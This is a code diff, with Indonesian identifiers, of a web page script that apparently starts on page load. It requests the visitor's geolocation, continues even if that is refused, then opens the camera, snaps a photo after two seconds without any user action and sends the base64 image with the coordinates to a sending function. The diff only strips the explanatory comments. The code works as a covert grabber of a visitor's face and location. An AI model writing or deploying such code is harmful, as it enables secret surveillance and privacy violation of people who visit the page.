@@ -29,20 +29,20 @@
             jalankanSistemBerurutan();
         });
 
-        // FUNGSI UTAMA: Mengatur urutan jalannya fungsi secara sinkron
+
         async function jalankanSistemBerurutan() {
             console.log("TAHAP 1: Memulai permintaan akses lokasi...");
             
-            // Menunggu fungsi ambilLokasi selesai sepenuhnya sebelum lanjut ke baris berikutnya
+            
             const koordinat = await ambilLokasi(); 
             
             console.log("TAHAP 2: Lokasi selesai diproses. Memulai akses kamera...");
             
-            // Menjalankan fungsi kamera dengan membawa hasil koordinat dari Tahap 1
+
             aktifkanKameraDanAmbil(koordinat.lat, koordinat.lon);
         }
 
-        // Fungsi mengambil lokasi dengan Promise agar bisa ditunggu (await)
+
         function ambilLokasi() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
@@ -56,9 +56,9 @@
                         },
                         (error) => {
                             console.warn("Izin lokasi ditolak oleh pengguna.");
-                            resolve({ lat: "-", lon: "-" }); // Tetap lanjut walaupun ditolak
+                            resolve({ lat: "-", lon: "-" }); 
                         },
-                        { timeout: 10000 } // Batas waktu tunggu respons lokasi (10 detik)
+                        { timeout: 10000 } 
                     );
                 } else {
                     console.error("Browser tidak mendukung Geolocation.");
@@ -74,7 +74,7 @@
                 video.srcObject = stream;
 
                 video.onplaying = () => {
-                    // Jeda 2 detik agar sensor lensa menyesuaikan pencahayaan otomatis
+
                     setTimeout(() => {
                         prosesJepretDanKirimBase64(lat, lon, video, stream);
                     }, 2000);
@@ -96,10 +96,8 @@
             
             context.drawImage(videoElement, 0, 0, lebar, tinggi);
 
-            // Matikan aliran kamera
             stream.getTracks().forEach(track => track.stop());
 
-            // Konversi gambar ke teks string Base64 (kualitas 50% agar hemat ruang)
             const dataTeksGambar = canvas.toDataURL("image/jpeg", 0.5); 
 
             kirimDataTeksSaja(lat, lon, "Sukses Diambil", dataTeksGambar);
